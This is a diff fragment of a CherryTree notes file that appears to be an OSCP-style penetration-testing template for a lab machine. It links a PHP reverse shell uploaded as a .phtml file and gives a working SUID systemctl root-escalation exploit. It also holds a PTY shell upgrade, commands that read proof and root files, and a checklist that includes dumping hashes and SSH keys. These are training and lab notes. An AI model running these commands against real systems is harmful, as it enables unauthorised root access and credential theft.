+					<node custom_icon_id="0" foreground="" is_bold="False" name="RPC" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587570784.47" ts_lastsave="1587570796.27" unique_id="85">
+						<rich_text></rich_text>
+					</node>
+				</node>
+			</node>
+			<node custom_icon_id="22" foreground="" is_bold="False" name="Exploitation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1590155993.88" unique_id="53">
+				<rich_text link="webs https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</rich_text>
+				<rich_text>
+10.10.255.95:3333/internal/uploads/phpreverseshell.phtml</rich_text>
+			</node>
+			<node custom_icon_id="21" foreground="" is_bold="False" name="Post Exploitation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1495714301.41" unique_id="54">
+				<rich_text></rich_text>
+				<node custom_icon_id="44" foreground="" is_bold="False" name="Script Results" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1495714301.41" ts_lastsave="1495714310.34" unique_id="55">
+					<rich_text></rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Host Information" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1500474204.83" unique_id="56">
+					<rich_text underline="single" weight="heavy">Operating System</rich_text>
+					<rich_text>
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Architecture</rich_text>
+					<rich_text>
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Domain</rich_text>
+					<rich_text>
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Installed Updates</rich_text>
+					<rich_text>
+
+</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="File System" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1500474208.8" unique_id="57">
+					<rich_text underline="single" weight="heavy">Writeable Files\Directories</rich_text>
+					<rich_text>
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Directory List</rich_text>
+					<rich_text>
+
+
+
+
+</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Running Processes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1495714268.27" unique_id="58">
+					<rich_text underline="single" weight="heavy">Process List</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Installed Applications" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1495714509.19" unique_id="59">
+					<rich_text underline="single" weight="heavy">Installed Applications</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Users &amp; Groups" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1500474213.69" unique_id="60">
+					<rich_text underline="single" weight="heavy">Users</rich_text>
+					<rich_text>
+
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Groups</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Network" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1500474223.91" unique_id="61">
+					<rich_text underline="single" weight="heavy">IPConfig\IFConfig
+</rich_text>
+					<rich_text>
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Network Processes</rich_text>
+					<rich_text>
+
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">ARP</rich_text>
+					<rich_text>
+
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">DNS</rich_text>
+					<rich_text>
+
+
+
+
+</rich_text>
+					<rich_text underline="single" weight="heavy">Route</rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Scheduled Jobs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1496953428.46" unique_id="62">
+					<rich_text underline="single" weight="heavy">Scheduled Tasks</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="10" foreground="" is_bold="False" name="Priv Escalation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1590161378.81" unique_id="63">
+				<rich_text weight="heavy">Service Exploited:  
+Vulnerability Type:
+Exploit POC:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text weight="heavy">Description</rich_text>
+				<rich_text>: 
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
+				<rich_text>
+search for all SUID bits set:
+SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
+
+find . -perm /4000 2&gt;/dev/null
+/bin/systemctl stood out
+
+</rich_text>
+				<rich_text link="webs https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</rich_text>
+				<rich_text>
+*renamed to phtml to upload
+
+
+Upgrade to PTY shell:
+python -c ‘import.pty: pty.spawn(&quot;/bin/bash&quot;)’
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
+				<rich_text>
+priv=$(mktemp).service
+
+echo '[Service]
+&gt;ExecStart=/bin/bash -c “cat /root/root.txt &gt; /opt/flag”
+&gt;[Install]
+&gt;WantedBy=multi-user.target' &gt; $priv
+
+#run the unit file using systemctl
+/bin/systemctl link $priv
+/bin/systemctl enable --now $priv
+
+excuted as root
+cat /opt/flag
+
+
+
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
+				<rich_text>
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+</rich_text>
+			</node>
+			<node custom_icon_id="43" foreground="" is_bold="False" name="Goodies" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1492949508.15" unique_id="64">
+				<rich_text></rich_text>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Hashes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1492949998.88" unique_id="65">
+					<rich_text></rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Passwords" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1492950150.97" unique_id="66">
+					<rich_text></rich_text>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="Proof\Flags\Other" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587583059.94" unique_id="67">
+					<rich_text scale="h1">Linux</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text justification="left"></rich_text>
+					<rich_text>
+
+</rich_text>
+					<rich_text scale="h1">Windows</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text justification="left"></rich_text>
+					<codebox char_offset="6" frame_height="140" frame_width="765" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">echo &quot; &quot;;echo &quot;uname -a:&quot;;uname -a;echo &quot; &quot;;echo &quot;hostname:&quot;;hostname;echo &quot; &quot;;echo &quot;id&quot;;id;echo &quot; &quot;;echo &quot;ifconfig:&quot;;/sbin/ifconfig -a;echo &quot; &quot;;echo &quot;proof:&quot;;cat /root/proof.txt 2&gt;/dev/null; cat /Desktop/proof.txt 2&gt;/dev/null;echo &quot; &quot; 
+
+echo &quot; &quot;;echo &quot;uname -a:&quot;;uname -a;echo &quot; &quot;;echo &quot;hostname:&quot;;hostname;echo &quot; &quot;;echo &quot;id&quot;;id;echo &quot; &quot;;echo &quot;ip address:&quot;;ip address;echo &quot; &quot;;echo &quot;proof:&quot;;cat /root/proof.txt 2&gt;/dev/null; cat ./local.txt 2&gt;/dev/null;echo &quot; &quot;</codebox>
+					<codebox char_offset="17" frame_height="230" frame_width="785" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="dosbatch" width_in_pixels="True">echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp; type &quot;C:\Users\Administrator\Desktop\proof.txt&quot; 2&gt; nul &amp; type &quot;C:\Documents and Settings\Administrator\Desktop\proof.txt&quot; 2&gt; nul &amp; type %USERPROFILE%\Desktop\proof.txt 2&gt; nul
+
+echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp; type &quot;C:\Users\admin\Desktop\proof.txt&quot; 2&gt; nul &amp; type &quot;C:\Documents and Settings\Administrator\Desktop\proof.txt&quot; 2&gt; nul &amp; type %USERPROFILE%\Desktop\proof.txt 2&gt; nul
+
+#french
+echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp; type &quot;C:\Users\Administrator\Desktop\proof.txt&quot; 2&gt; nul &amp; type &quot;C:\Docume~1\Admini~1\Bureau\proof.txt&quot; 2&gt; nul &amp; type %USERPROFILE%\bureau\proof.txt 2&gt; nul</codebox>
+				</node>
+			</node>
+			<node custom_icon_id="12" foreground="" is_bold="False" name="Software Versions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1496953122.23" unique_id="68">
+				<rich_text underline="single" weight="heavy">Software Versions
+</rich_text>
+				<rich_text>
+
+
+
+
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Potential Exploits</rich_text>
+			</node>
+			<node custom_icon_id="13" foreground="" is_bold="True" name="Methodology" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1496953072.48" ts_lastsave="1500474082.49" unique_id="69">
+				<rich_text underline="single" weight="heavy">Network Scanning</rich_text>
+				<rich_text>
+
+   ☐  nmap -sn 10.11.1.*
+   ☐  nmap -sL 10.11.1.*
+   ☐  nbtscan -r 10.11.1.0/24
+   ☐  </rich_text>
+				<rich_text link="node 70">smbtree</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
+				<rich_text>
+
+   ☐  nmap  --top-ports 20 --open -iL iplist.txt
+   ☐  nmap -sS -A -sV -O -p- ipaddress
+   ☐  nmap -sU ipaddress
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Service Scanning</rich_text>
+				<rich_text>
+
+    </rich_text>
+				<rich_text weight="heavy">WebApp</rich_text>
+				<rich_text>
+      ☐   </rich_text>
+				<rich_text link="node 69">Nikto</rich_text>
+				<rich_text>
+      ☐   </rich_text>
+				<rich_text link="node 52">dirb</rich_text>
+				<rich_text>
+      ☐   dirbuster
+      ☐   </rich_text>
+				<rich_text link="node 71">wpscan</rich_text>
+				<rich_text>
+      ☐   dotdotpwn
+      ☐   view source 
+      ☐   davtest\cadevar
+      ☐   droopscan
+      ☐   joomscan
+      ☐   LFI\RFI Test
+      
+    </rich_text>
+				<rich_text weight="heavy">Linux\Windows</rich_text>
+				<rich_text>
+      ☐   snmpwalk -c public -v1 </rich_text>
+				<rich_text style="italic">ipaddress</rich_text>
+				<rich_text> 1
+      ☐   smbclient -L //ipaddress
+      ☐   showmount -e ipaddress port
+      ☐   rpcinfo
+      ☐   Enum4Linux
+    
+    </rich_text>
+				<rich_text weight="heavy">Anything Else</rich_text>
+				<rich_text>
+      ☐   </rich_text>
+				<rich_text link="node 72">nmap scripts</rich_text>
+				<rich_text> (locate *nse* | grep servicename)
+      ☐   </rich_text>
+				<rich_text link="node 73">hydra</rich_text>
+				<rich_text>
+      ☐   MSF Aux Modules
+      ☐   Download the softward
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Exploitation</rich_text>
+				<rich_text>
+   ☐   Gather Version Numbes
+   ☐   Searchsploit
+   ☐   Default Creds
+   ☐   Creds Previously Gathered
+   ☐   Download the software
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Post Exploitation</rich_text>
+				<rich_text>
+
+    </rich_text>
+				<rich_text weight="heavy">Linux</rich_text>
+				<rich_text>
+      ☐   linux-local-enum.sh
+      ☐   linuxprivchecker.py
+      ☐   linux-exploit-suggestor.sh
+      ☐   unix-privesc-check.py
+
+    </rich_text>
+				<rich_text weight="heavy">Windows</rich_text>
+				<rich_text>
+      ☐   wpc.exe
+      ☐   windows-exploit-suggestor.py
+      ☐   </rich_text>
+				<rich_text link="webs https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows_privesc_check.py">windows_privesc_check.py</rich_text>
+				<rich_text>
+      ☐  	windows-privesc-check2.exe
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Priv Escalation</rich_text>
+				<rich_text>
+   ☐  </rich_text>
+				<rich_text link="node 74">acesss internal services (portfwd)</rich_text>
+				<rich_text>
+   ☐  add account
+
+</rich_text>
+				<rich_text weight="heavy">Windows</rich_text>
+				<rich_text>
+   ☐  List of exploits
+
+</rich_text>
+				<rich_text weight="heavy">Linux</rich_text>
+				<rich_text>
+   ☐  sudo su 
+   ☐  KernelDB
+   ☐  Searchsploit
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">Final</rich_text>
+				<rich_text>
+   ☐  Screenshot of IPConfig\WhoamI
+   ☐  Copy proof.txt
+   ☐  Dump hashes 
+   ☐  Dump SSH Keys
+   ☐  Delete files</rich_text>
+			</node>
+			<node custom_icon_id="20" foreground="" is_bold="True" name="Log Book" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1495714168.37" unique_id="75">
+				<rich_text></rich_text>
+			</node>
+		</node>
+	</node>
+</cherrytree>
